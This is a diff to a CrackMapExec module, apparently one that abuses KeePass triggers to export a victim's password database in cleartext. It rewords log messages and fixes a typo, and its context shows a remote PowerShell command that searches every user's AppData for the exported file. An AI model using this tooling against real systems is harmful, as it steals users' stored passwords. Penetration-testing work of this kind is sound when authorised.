@@ -271,8 +271,9 @@ class CMEModule:
     def poll(self, context, connection):
         """Search for the cleartext database export file in the specified export folder (until found, or manually exited by the user)"""
         found = False
-        context.log.info('Polling for database export every {} seconds, please be patient'.format(self.poll_frequency_seconds))
-        context.log.info('we need to wait for the target to enter his master password ! Press CTRL+C to abort and use clean option to cleanup everything')
+        context.log.info('We need to wait for the user to open the database.')
+        context.log.info('Press CTRL+C to abort and use CLEAN option if you want to revert changes made to KeePass config.')
+        context.log.info('Polling for database export every {} seconds..'.format(self.poll_frequency_seconds))
         # if the specified path is %APPDATA%, we need to check in every user's folder
         if self.export_path == '%APPDATA%' or self.export_path == '%appdata%':
             poll_export_command_str = 'powershell.exe "Get-LocalUser | Where {{ $_.Enabled -eq $True }} | select name | ForEach-Object {{ Write-Output (\'C:\\Users\\\'+$_.Name+\'\\AppData\\Roaming\\{}\')}} | ForEach-Object {{ if (Test-Path $_ -PathType leaf){{ Write-Output $_ }}}}"'.format(self.export_name)
@@ -376,7 +377,7 @@ class CMEModule:
             else:
                 context.log.info('Found trigger "{}" in configuration file, removing'.format(self.trigger_name))
                 if keepass_processes and self.safe_edits == 'FALSE':
-                    context.log.info('As KeePass is running so the config file may be overidden and the trigger not deleted (it will most probably don\'t, but you can use SAFE_EDITS if you want to be 100% sure)')
+                    context.log.info('As KeePass is running so the config file may be overridden and the trigger not deleted (it will most probably don\'t, but you can use SAFE_EDITS if you want to be 100% sure)')
         else:
             context.log.success('No trigger "{}" found in "{}", skipping'.format(self.trigger_name, self.keepass_config_path))
 
